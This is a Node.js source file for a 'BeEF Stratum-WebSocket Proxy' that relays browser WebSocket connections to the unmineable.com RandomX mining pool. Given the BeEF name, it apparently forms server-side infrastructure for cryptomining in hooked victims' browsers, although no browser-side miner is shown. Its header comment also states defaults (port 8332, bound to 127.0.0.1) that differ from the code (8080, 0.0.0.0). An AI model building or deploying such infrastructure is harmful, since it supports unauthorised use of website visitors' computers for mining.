#!/usr/bin/env node
/**
 * BeEF Stratum-WebSocket Proxy
 * =============================
 * Bridges browser WebSocket connections to the unmineable.com TCP stratum pool.
 * Browsers cannot open raw TCP connections, so this proxy sits in the middle:
 *
 *   Browser  <──WebSocket──>  proxy.js  <──TCP──>  unmineable.com:3333
 *
 * Set up as a systemd service by deploy.sh.
 * Configuration via environment variables or command-line:
 *   MINER_POOL_HOST   default: rx.unmineable.com
 *   MINER_POOL_PORT   default: 3333
 *   MINER_PROXY_PORT  default: 8332
 *   MINER_PROXY_HOST  default: 127.0.0.1  (nginx fronts it with wss://)
 */

'use strict';

const net  = require('net');
const http = require('http');
const { WebSocketServer } = require('ws');

const POOL_HOST  = process.env.MINER_POOL_HOST  || 'rx.unmineable.com';
const POOL_PORT  = parseInt(process.env.MINER_POOL_PORT)  || 3333;
const PROXY_PORT = parseInt(process.env.MINER_PROXY_PORT) || 8080;
const PROXY_HOST = process.env.MINER_PROXY_HOST || '0.0.0.0';

const server = http.createServer((req, res) => {
  res.writeHead(200);
  res.end('BeEF Stratum-WS Proxy running\n');
});

const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
  const client = req.socket.remoteAddress;
  console.log(`[miner-proxy] browser connected from ${client}`);

  const tcp = net.createConnection({ host: POOL_HOST, port: POOL_PORT });
  let tcpReady = false;
  const tcpQueue = [];

  tcp.on('connect', () => {
    tcpReady = true;
    tcpQueue.forEach(m => tcp.write(m + '\n'));
    tcpQueue.length = 0;
    console.log(`[miner-proxy] pool connected for ${client}`);
  });

  // Pool → Browser
  let tcpBuf = '';
  tcp.on('data', data => {
    tcpBuf += data.toString();
    let nl;
    while ((nl = tcpBuf.indexOf('\n')) !== -1) {
      const line = tcpBuf.slice(0, nl).trim();
      tcpBuf = tcpBuf.slice(nl + 1);
      if (line && ws.readyState === ws.OPEN) {
        ws.send(line);
      }
    }
  });

  // Browser → Pool
  ws.on('message', msg => {
    const line = msg.toString().trim();
    if (!line) return;
    if (tcpReady) {
      tcp.write(line + '\n');
    } else {
      tcpQueue.push(line);
    }
  });

  tcp.on('error', err => {
    console.error(`[miner-proxy] pool error for ${client}: ${err.message}`);
    if (ws.readyState === ws.OPEN) ws.close(1011, 'pool error');
  });

  tcp.on('close', () => {
    if (ws.readyState === ws.OPEN) ws.close(1000, 'pool closed');
  });

  ws.on('close', () => {
    tcp.destroy();
    console.log(`[miner-proxy] browser disconnected: ${client}`);
  });

  ws.on('error', () => tcp.destroy());
});

server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log(`[miner-proxy] listening on ${PROXY_HOST}:${PROXY_PORT}`);
  console.log(`[miner-proxy] forwarding to ${POOL_HOST}:${POOL_PORT}`);
});
